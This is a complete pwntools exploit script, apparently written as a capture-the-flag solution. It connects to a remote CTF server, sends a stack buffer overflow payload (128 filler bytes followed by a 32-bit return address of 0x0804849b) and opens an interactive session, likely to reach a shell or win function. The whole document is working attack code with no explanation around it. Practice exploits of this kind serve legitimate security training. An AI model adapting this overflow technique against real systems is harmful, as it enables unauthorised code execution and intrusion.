from pwn import*

p = remote("ctf.j09hyun.xyz",3001)
payload = "A" * 128 + p32(0x0804849b)

p.sendline(payload)
p.interactive()
